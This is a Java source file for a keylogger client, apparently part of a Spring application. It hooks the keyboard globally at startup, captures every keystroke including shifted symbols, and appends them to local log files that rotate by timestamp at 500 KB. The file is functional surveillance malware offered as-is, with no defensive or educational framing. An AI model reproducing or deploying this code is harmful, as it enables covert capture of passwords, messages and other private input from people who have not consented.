package com.example.keyloggerclient;

import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import org.springframework.context.annotation.Configuration;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

@Configuration
public class KeyListener {

    // `./data/timestamp.txt`
    private static Path file = Paths.get(Constants.DATA_FILE);

    public KeyListener() {
        // Might throw an UnsatisfiedLinkError if the native library fails to load or a RuntimeException if hooking fails
        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of raw input
        System.out.println("Global keyboard hook successfully started");

        keyListener(keyboardHook);
    }

    private static void keyListener(GlobalKeyboardHook keyboardHook) {
        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
            @Override
            public void keyPressed(GlobalKeyEvent event) {
                char character;

                if (event.isShiftPressed()) {
                    int keyCode = event.getVirtualKeyCode();
                    character = characterMapping(keyCode);
                } else {
                    character = event.getKeyChar();
                }

                OutputStream os = createFile();

                long fileSize = file.toFile().length();

                // create the new file when file size is beyond 500 KB
                if (fileSize > (500 * 1024)) {
                    try {
                        // close the file before creating new file
                        os.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    // change file name with new `timestamp.txt`
                    file = Paths.get(getDateTime() + ".txt");
                    os = createFile();
                }

                System.out.print(character);
                System.out.print(fileSize);

                // create writer
                PrintWriter writer = new PrintWriter(os);
                // write into file and flush
                writer.print(character);
                writer.flush();
            }

            private OutputStream createFile() {
                OutputStream os;
                try {
                    os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                            StandardOpenOption.APPEND);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                return os;
            }

            @Override
            public void keyReleased(GlobalKeyEvent event) {

            }

            private char characterMapping(int keyCode) {
                return switch (keyCode) {
                    case 49 -> '!';
                    case 50 -> '@';
                    case 51 -> '#';
                    case 52 -> '$';
                    case 53 -> '%';
                    case 54 -> '^';
                    case 55 -> '&';
                    case 56 -> '*';
                    case 57 -> '(';
                    case 48 -> ')';
                    case 189 -> '_';
                    case 187 -> '+';
                    default -> 0;
                };
            }
        });
    }

    // utility method to create timestamp
    private static String getDateTime() {
        return LocalDateTime.now().format(DateTimeFormatter.ofPattern("dd-MM-yyyy_HH-mm-ss"));
    }


}


//import java.util.concurrent.Executors;
//        import java.util.concurrent.ScheduledExecutorService;
//        import java.util.concurrent.TimeUnit;

//        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
//        executor.scheduleAtFixedRate(() -> {
//        }, 0, 128, TimeUnit.MILLISECONDS);

//            private void writeIntoFile(char character) {
//                try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
//                        StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
//                    writer.print(character);
//                    writer.flush();
//                    System.out.print(character);
//                    long length = file.toFile().length();
//
//
//                    System.out.print(length);
//                } catch (IOException ex) {
//                    log.error(ex.getMessage(), ex);
//                    System.exit(-1);
//                }
//            }